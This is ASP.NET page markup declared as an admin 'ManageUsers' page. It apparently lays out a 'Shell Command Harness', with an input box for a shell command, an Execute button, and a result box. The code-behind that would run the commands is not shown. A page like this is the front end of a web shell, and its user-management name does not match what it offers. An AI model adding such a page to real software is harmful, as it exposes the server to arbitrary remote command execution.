<%@ Page Title="" Language="C#" MasterPageFile="~/UWAC.master" AutoEventWireup="true" CodeFile="ManageUsers.aspx.cs" Inherits="Admin_ManageUsers" %>
<%@ MasterType VirtualPath="~/UWAC.master" %>

<asp:Content ID="Content1" ContentPlaceHolderID="oBodyPlaceHolder" Runat="Server">

    <table>
        <tr>
            <td>
    <table>
            <tr><td>&nbsp;</td><td><h1 align="left">Shell Command Harness</h1></td></tr>
            <tr><td>&nbsp;</td><td>&nbsp;</td></tr>
            <tr><td>&nbsp;</td><td>Shell Command</td></tr>
            <tr><td>
                <br />
                </td><td>
                <asp:TextBox ID="Input" runat="server" TextMode="MultiLine" Width="700px" Height="30px" ></asp:TextBox>
            </td></tr>
            <tr><td>
                &nbsp;</td><td>
                    <br /><br />
                <asp:Button ID="ExecuteCode" runat="server" Text="Execute" Width="200" OnClick="ExecuteCode_Click" />
            </td></tr>
                <tr><td>&nbsp;</td>
                    <td><h3><br /><br />Result</h3></td>
                </tr>
                <tr>
                    <td>&nbsp;</td>
                    <td>
                        <asp:TextBox ID="ResultBox" TextMode="MultiLine" Width="700" Height="200" runat="server"></asp:TextBox>
                    </td>
                </tr>
        </table>


            </td>
            <td style="vertical-align: top">
                Users:
                <asp:Label ID="lblUsers" runat="server" Text=""></asp:Label>
            </td>
        </tr>
        
    </table>
</asp:Content>

